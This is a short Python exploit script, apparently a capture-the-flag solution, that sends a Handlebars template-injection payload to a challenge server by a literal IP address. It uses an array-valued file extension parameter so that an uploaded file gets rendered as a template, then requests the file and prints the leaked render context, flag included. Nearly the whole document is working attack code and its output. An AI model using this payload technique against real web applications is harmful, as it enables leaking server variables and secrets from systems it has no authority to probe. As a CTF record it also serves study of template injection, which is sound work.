#!/usr/bin/env python3

import requests
r = requests.post('http://35.221.86.202/ca30570664932404ed7e96ad8f5e9eaf8f89c3d47a6dd50c200800a3f15ccd5b', json={
    'contents': '{{#each this}} {{@key}} ' + ' '.join(['{{lookup this %d}}' % x for x in range(64)]) + ' {{/each}}',
    'filename': 'readflag',
    'ext': [".ejs","a","b",".hbs"]
})
print(r.text)
# {"result":true,"path":"/ca30570664932404ed7e96ad8f5e9eaf8f89c3d47a6dd50c200800a3f15ccd5b/readflag"}

r = requests.get('http://35.221.86.202/ca30570664932404ed7e96ad8f5e9eaf8f89c3d47a6dd50c200800a3f15ccd5b/readflag.ejs,a,b,.hbs')
print(r.text)

"""
 settings                                                                  flag L I N E C T F { I _ t h i n k _ e m i l i a _ i s _ r e a l l l l l y _ t 3 n s h i }                       _locals                                                                  cache false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false false
"""